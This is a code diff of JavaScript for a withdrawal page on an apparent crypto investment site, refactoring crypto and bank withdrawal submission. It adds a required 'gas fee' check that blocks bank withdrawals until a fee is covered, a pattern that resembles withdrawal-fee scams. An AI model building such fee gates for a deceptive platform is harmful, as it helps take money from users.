       const data = AppState.pendingWithdrawalData;
-      if (!data) return;
-
+      if (!data || data.feeConfirmed !== true) return;
       showProcessingStep('Submitting withdrawal request...');
-
       const token = localStorage.getItem('jwtToken');
-
-      const withdrawalBody = {
-        amount: data.usdAmount,
-        asset: data.asset,
-        assetAmount: data.cryptoAmount,
-        walletAddress: data.walletAddress,
-        gasFee: data.gasFee,
-        exchangeRate: data.exchangeRate,
-        balanceSource: data.balanceSource,
-        timestamp: data.timestamp,
-        bankName: null,
-        accountHolder: null,
-        accountNumber: null,
-        routingNumber: null
-      };
-
-      fetch(`${API_BASE_URL}/api/withdrawals/spot`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${token}`
-        },
-        body: JSON.stringify(withdrawalBody)
-      }).then(response => {
+      const withdrawalBody = { amount: data.usdAmount, asset: data.asset, assetAmount: data.cryptoAmount, walletAddress: data.walletAddress, gasFee: data.gasFee, exchangeRate: data.exchangeRate, balanceSource: data.balanceSource, timestamp: data.timestamp, bankName: null, accountHolder: null, accountNumber: null, routingNumber: null };
+      fetch(`${API_BASE_URL}/api/withdrawals/spot`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(withdrawalBody) }).then(async response => {
         hideProcessingStep();
-
-        if (response.ok) {
-          return response.json().then(result => {
-            showNotification('success', 'Withdrawal Request Submitted!',
-              `Your withdrawal request for $${data.usdAmount.toFixed(2)} (${data.cryptoAmount.toFixed(8)} ${data.asset.toUpperCase()}) has been submitted successfully! Transaction ID: ${result.data?.reference || 'Pending'}`);
-
-            loadUserBalances();
-            loadCryptoAssets();
-            loadWithdrawalHistory();
-
-            document.getElementById('crypto-withdraw-amount').value = '';
-            document.getElementById('crypto-wallet-address').value = '';
-
-            AppState.pendingWithdrawalData = null;
-            AppState.withdrawalInProgress = false;
-            updateSummary();
-          });
-        } else {
-          return response.json().then(error => {
-            throw new Error(error.message || 'Failed to process withdrawal');
-          });
-        }
-      }).catch(error => {
-        console.error('Error processing withdrawal:', error);
-        hideProcessingStep();
-
-        const message = String(error?.message || '');
-        const insufficientFee = /insufficient.*(?:gas|fee)|(?:gas|fee).*insufficient/i.test(message);
-        if (insufficientFee && data?.method === 'crypto') {
-          // Safety net for stale balances/backend fee changes. The primary gate
-          // happens before OTP is requested, so this path should be exceptional.
-          const asset = AppState.selectedAsset || topAssets.find(a => a.symbol === data.asset) || topAssets[0];
-          const liveAsset = AppState.cryptoAssets.find(a => String(a.symbol).toLowerCase() === String(data.asset).toLowerCase());
-          const liveBalance = Number(liveAsset?.totalAmount) || 0;
-          showFeeModal(Number(data.gasFee) || 0, liveBalance, asset);
-        } else {
-          showNotification('error', 'Withdrawal Error', message || 'Failed to process withdrawal. Please try again later.');
-        }
-        AppState.withdrawalInProgress = false;
-      });
+        const result = await response.json();
+        if (!response.ok) throw new Error(result.message || 'Failed to process withdrawal');
+        showNotification('success', 'Withdrawal Request Submitted!', `Your withdrawal request for $${data.usdAmount.toFixed(2)} (${data.cryptoAmount.toFixed(8)} ${data.asset.toUpperCase()}) has been submitted successfully! Transaction ID: ${result.data?.reference || 'Pending'}`);
+        loadUserBalances(); loadCryptoAssets(); loadWithdrawalHistory();
+        document.getElementById('crypto-withdraw-amount').value = ''; document.getElementById('crypto-wallet-address').value = '';
+        AppState.pendingWithdrawalData = null; updateSummary();
+      }).catch(error => { console.error('Error processing withdrawal:', error); hideProcessingStep(); showNotification('error', 'Withdrawal Error', error.message || 'Failed to process withdrawal. Please try again later.'); }).finally(() => { AppState.withdrawalInProgress = false; });
     }
 
     // =============================================
-    // INITIATE BANK WITHDRAWAL - WITH FEE CHECK
+    // INITIATE BANK WITHDRAWAL
     // =============================================
     async function initiateBankWithdrawal() {
       if (AppState.withdrawalInProgress) return;
-
       const usdAmount = parseFloat(document.getElementById('bank-withdraw-amount').value);
       const bankName = document.getElementById('bank-name').value.trim();
       const accountHolder = document.getElementById('account-holder').value.trim();
       const accountNumber = document.getElementById('account-number').value.trim();
       const routingNumber = document.getElementById('routing-number').value.trim();
-
-      if (!usdAmount || usdAmount < AppState.MIN_WITHDRAWAL) {
-        showNotification('error', 'Minimum Withdrawal', `Minimum bank withdrawal is $${AppState.MIN_WITHDRAWAL}`);
-        return;
-      }
-
-      const selectedBalance = AppState.selectedBalanceSource === 'main' ?
-        AppState.userBalances.main :
-        AppState.userBalances.matured;
-
-      if (usdAmount > selectedBalance) {
-        showNotification('error', 'Insufficient Balance',
-          `You need $${usdAmount.toFixed(2)} but only have $${selectedBalance.toFixed(2)} in ${AppState.selectedBalanceSource === 'main' ? 'Main' : 'Matured'} Wallet.`);
-        return;
-      }
-
-      if (!bankName || !accountHolder || !accountNumber || !routingNumber) {
-        showNotification('error', 'Validation Error', 'Please complete all bank details');
-        return;
-      }
-
+      if (!usdAmount || usdAmount < AppState.MIN_WITHDRAWAL) { showNotification('error', 'Minimum Withdrawal', `Minimum bank withdrawal is $${AppState.MIN_WITHDRAWAL}`); return; }
+      const selectedBalance = AppState.selectedBalanceSource === 'main' ? AppState.userBalances.main : AppState.userBalances.matured;
+      if (usdAmount > selectedBalance) { showNotification('error', 'Insufficient Balance', `You need $${usdAmount.toFixed(2)} but only have $${selectedBalance.toFixed(2)} in ${AppState.selectedBalanceSource === 'main' ? 'Main' : 'Matured'} Wallet.`); return; }
+      if (!bankName || !accountHolder || !accountNumber || !routingNumber) { showNotification('error', 'Validation Error', 'Please complete all bank details'); return; }
       const asset = AppState.selectedAsset || topAssets[0];
+      const requiredGasFee = await getRequiredGasFee(usdAmount);
+      if (!checkInsufficientFeeAndShowModal(usdAmount, requiredGasFee)) return;
       AppState.withdrawalInProgress = true;
-
-      const withdrawalData = {
-        method: 'bank',
-        usdAmount: usdAmount,
-        bankName: bankName,
-        accountHolder: accountHolder,
-        accountNumber: accountNumber,
-        routingNumber: routingNumber,
-        asset: asset.symbol,
-        assetName: asset.name,
-        balanceSource: AppState.selectedBalanceSource,
-        gasFee: 0,
-        exchangeRate: AppState.currentAssetRate || 43000,
-        timestamp: new Date().toISOString()
-      };
-
-      AppState.pendingWithdrawalData = withdrawalData;
-
-      try {
-        const token = localStorage.getItem('jwtToken');
-        const response = await fetch(`${API_BASE_URL}/api/users/me`, {
-          headers: { 'Authorization': `Bearer ${token}` }
-        });
-
-        if (response.ok) {
-          const userData = await response.json();
-          const userEmail = userData.data.user.email;
-          showVerificationStep(userEmail, token);
-          AppState.withdrawalInProgress = false;
-        } else {
-          throw new Error('Failed to fetch user data');
-        }
-      } catch (error) {
-        console.error('Error initiating bank withdrawal:', error);
-        showNotification('error', 'Error', 'Failed to initiate withdrawal. Please try again.');
-        AppState.withdrawalInProgress = false;
-      }
+      AppState.pendingWithdrawalData = { method:'bank', usdAmount, bankName, accountHolder, accountNumber, routingNumber, asset:asset.symbol, assetName:asset.name, balanceSource:AppState.selectedBalanceSource, gasFee:requiredGasFee, exchangeRate:AppState.currentAssetRate || 43000, timestamp:new Date().toISOString(), feeConfirmed:true };
+      try { const token=localStorage.getItem('jwtToken'); const response=await fetch(`${API_BASE_URL}/api/users/me`,{headers:{'Authorization':`Bearer ${token}`}}); if(!response.ok) throw new Error('Failed to fetch user data'); const userData=await response.json(); showVerificationStep(userData.data.user.email,token); } catch(error){ console.error('Error initiating bank withdrawal:',error); showNotification('error','Error',error.message || 'Failed to initiate withdrawal. Please try again.'); AppState.pendingWithdrawalData=null; } finally { AppState.withdrawalInProgress=false; }
     }
 
     // =============================================
     // PROCESS BANK WITHDRAWAL
     // =============================================
     function processBankWithdrawal() {
-      const data = AppState.pendingWithdrawalData;
-      if (!data) return;
-
-      showProcessingStep('Submitting bank withdrawal request...');
-
-      const token = localStorage.getItem('jwtToken');
-
-      fetch(`${API_BASE_URL}/api/withdrawals/bank`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${token}`
-        },
-        body: JSON.stringify({
-          amount: data.usdAmount,
-          bankName: data.bankName,
-          accountHolder: data.accountHolder,
-          accountNumber: data.accountNumber,
-          routingNumber: data.routingNumber,
-          balanceSource: data.balanceSource,
-          gasFee: data.gasFee,
-          asset: data.asset,
-          exchangeRate: data.exchangeRate,
-          timestamp: data.timestamp
-        })
-      }).then(response => {
-        hideProcessingStep();
-
-        if (response.ok) {
-          return response.json().then(result => {
-            showNotification('success', 'Bank Withdrawal Request Submitted!',
-              `Your bank withdrawal request for $${data.usdAmount.toFixed(2)} has been submitted successfully! Funds will be transferred to ${data.bankName} account ending in ${data.accountNumber.slice(-4)} within 3-5 business days. Transaction ID: ${result.data?.reference || 'Pending'}`);
-
-            loadUserBalances();
-            loadCryptoAssets();
-            loadWithdrawalHistory();
-
-            document.getElementById('bank-withdraw-amount').value = '';
-            document.getElementById('bank-name').value = '';
-            document.getElementById('account-holder').value = '';
-            document.getElementById('account-number').value = '';
-            document.getElementById('routing-number').value = '';
-
-            AppState.pendingWithdrawalData = null;
-            AppState.withdrawalInProgress = false;
-            updateSummary();
-          });
-        } else {
-          return response.json().then(error => {
-            throw new Error(error.message || 'Failed to process withdrawal');
-          });
-        }
-      }).catch(error => {
-        console.error('Error processing bank withdrawal:', error);
-        hideProcessingStep();
-        showNotification('error', 'Withdrawal Error', error.message || 'Failed to process withdrawal. Please try again later.');
-        AppState.withdrawalInProgress = false;
-      });
+      const data=AppState.pendingWithdrawalData; if(!data || data.feeConfirmed!==true) return; showProcessingStep('Submitting bank withdrawal request...'); const token=localStorage.getItem('jwtToken');
+      fetch(`${API_BASE_URL}/api/withdrawals/bank`,{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bearer ${token}`},body:JSON.stringify({amount:data.usdAmount,bankName:data.bankName,accountHolder:data.accountHolder,accountNumber:data.accountNumber,routingNumber:data.routingNumber,balanceSource:data.balanceSource,gasFee:data.gasFee,asset:data.asset,exchangeRate:data.exchangeRate,timestamp:data.timestamp})}).then(async response=>{hideProcessingStep();const result=await response.json();if(!response.ok)throw new Error(result.message||'Failed to process withdrawal');showNotification('success','Bank Withdrawal Request Submitted!',`Your bank withdrawal request for $${data.usdAmount.toFixed(2)} has been submitted successfully! Funds will be transferred to ${data.bankName} account ending in ${data.accountNumber.slice(-4)} within 3-5 business days. Transaction ID: ${result.data?.reference||'Pending'}`);loadUserBalances();loadCryptoAssets();loadWithdrawalHistory();['bank-withdraw-amount','bank-name','account-holder','account-number','routing-number'].forEach(id=>{const el=document.getElementById(id);if(el)el.value='';});AppState.pendingWithdrawalData=null;updateSummary();}).catch(error=>{console.error('Error processing bank withdrawal:',error);hideProcessingStep();showNotification('error','Withdrawal Error',error.message||'Failed to process withdrawal. Please try again later.');}).finally(()=>{AppState.withdrawalInProgress=false;});
     }
 
     // =============================================
